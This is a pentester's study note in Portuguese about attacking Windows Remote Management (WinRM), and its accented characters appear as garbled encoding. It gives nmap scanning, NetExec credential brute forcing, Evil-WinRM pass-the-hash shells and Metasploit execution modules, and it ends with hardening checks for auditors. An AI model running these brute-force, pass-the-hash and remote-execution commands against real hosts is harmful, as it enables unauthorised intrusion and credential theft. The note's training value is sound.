#+title: Win Rm
#+author: gabriel

* ü™ü Intro
O Windows Remote Management (WinRM) √© a implementa√ß√£o da Microsoft do protocolo WS-Management, permitindo que sistemas gerenciem e troquem informa√ß√µes de gerenciamento operacional remotamente.

** Key Features
- Acesso remoto a hosts Windows em uma rede local para execu√ß√£o de comandos.
- Gest√£o e configura√ß√£o centralizada de servidores e esta√ß√µes de trabalho.
- Utiliza objetos Windows Management Instrumentation (WMI) para obter dados do sistema.

** Network Ports
- *TCP 5985:* Tr√°fego HTTP (Padr√£o).
- *TCP 5986:* Tr√°fego HTTPS criptografado.

* üîç Reconnaissance & Brute Force
Antes de explorar, precisamos validar se a porta est√° aberta e se temos credenciais v√°lidas.

** Scanning with Nmap
#+BEGIN_SRC bash
nmap -sV -p 5985,5986 <TARGET_IP>
#+END_SRC

** Brute Force with CrackMapExec / NetExec
Como voc√™ j√° utiliza o `NetExec`, ele √© ideal para identificar usu√°rios e senhas v√°lidas via WinRM:
#+BEGIN_SRC bash
# Tentativa de login com lista de usu√°rios e senhas
netexec winrm <TARGET_IP> -u users.txt -p passwords.txt
#+END_SRC

* üöÄ Practical Exploitation (Sem Metasploit)
A ferramenta padr√£o da ind√∫stria para isso √© o *Evil-WinRM*, um script Ruby que cria uma shell interativa poderosa.

** Using Evil-WinRM
#+BEGIN_SRC bash
# Conex√£o direta com credenciais claras
evil-winrm -i <TARGET_IP> -u <USER> -p <PASSWORD>

# Conex√£o usando o Hash (Pass-the-Hash)
evil-winrm -i <TARGET_IP> -u <USER> -H <NTHASH>
#+END_SRC

** Key Features inside Evil-WinRM:
- *Upload/Download:* Transfer√™ncia de arquivos simplificada.
- *Load Scripts:* Carregar scripts PowerShell diretamente na mem√≥ria (ex: Mimikatz ou PowerUp).
- *Menu:* Atalhos para bypass de AMSI e extra√ß√£o de credenciais.

* üõ†Ô∏è Practical Exploitation (Com Metasploit)
O Metasploit √© √∫til quando voc√™ deseja atualizar sua sess√£o para uma Meterpreter para p√≥s-explora√ß√£o avan√ßada.

** WinRM Script Exec
Este m√≥dulo executa comandos no alvo usando credenciais v√°lidas.
1. =use exploit/windows/winrm/winrm_script_exec=
2. =set RHOSTS <TARGET_IP>=
3. =set USERNAME <USER>=
4. =set PASSWORD <PASSWORD>=
5. =set FORCE_VBS true= (√ötil para garantir a execu√ß√£o da carga √∫til)
6. =exploit=

** WinRM Login Scanner
Para testar credenciais em massa dentro do framework:
1. =use auxiliary/scanner/winrm/winrm_login=
2. Configurar =USER_FILE= e =PASS_FILE=.
3. =run=

* üí° Pentester Insights: Audit & Compliance
Alinhando com suas notas de auditoria e NIST SP 800-53:

** Audit Recommendation (AU-6)
- *Check:* O WinRM deve ser configurado para aceitar apenas conex√µes via HTTPS (Porta 5986) em ambientes de produ√ß√£o.
- *Check:* Verifique se o "Basic Authentication" est√° desativado, for√ßando o uso de Kerberos ou NTLM com criptografia.
  
** Pentest Tip
- Se voc√™ encontrar o WinRM aberto, sempre tente o *Pass-the-Hash*. Muitas vezes, administradores reutilizam senhas em v√°rios servidores, facilitando a movimenta√ß√£o lateral.
